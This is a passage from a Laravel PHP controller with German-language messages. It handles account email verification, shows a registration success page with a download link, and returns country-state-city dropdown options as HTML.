			Session::flash('success_title','Konto erfolgreich verifiziert');

			Session::flash('success_register','Ihre E-Mail wurde erfolgreich verifiziert. Ihre Login-Daten wurden an Ihre E-Mail-Adresse gesendet. Bitte überprüfen Sie Ihre E-Mail.');
			return redirect('/success-registration');

		}
		else{
			Session::flash('password','Ihr Konto wurde bereits verifiziert. Bitte einloggen und genießen.');
			return redirect('/login');
		}

	}
	else{

		Session::flash('password','Wir kennen dich nicht. Entschuldigung für die Unannehmlichkeiten.');

		return redirect('/login');

	}
}


public function successRegistration(){
	if(Session::has('success_register')){
		$general_info=DB::table('general_information')->first();
		$server_configs = DB::table('server_configs')->select('download_link')->first();
  		$download_link = $server_configs->download_link;
		return view('backEnd.'.app()->getLocale().'.auth.success-registration',compact('general_info','download_link'));
	}
	
	return view('errors.'.app()->getLocale().'.404');
}


    //  Get States

public function getStates(Request $request){


	$states=DB::table('states')->where('country_id',$request->id)->get();
	echo '<option id="" selected="selected" disabled="disabled">Select State</option>';
	foreach($states as $state){
		echo  '<option value="'.$state->name.'" id="'.$state->id.'"';

		echo '>'.$state->name.'</option>';
	}

}


//   Get Cities

public function getCities(Request $request){

	$cities=DB::table('cities')->where('state_id',$request->id)->get();
	$state=DB::table('states')->where('id',$request->id)->first();
	echo '<option selected="selected" disabled="disabled">Select City</option>';
	if(count($cities)==0){
		echo '<option selected="selected" value="'.$state->name.'">'.$state->name.'</option>';
	}
	foreach($cities as $city){
		echo  '<option value="'.$city->name.'"';

		echo '>'.$city->name.'</option>';
	}
}






}
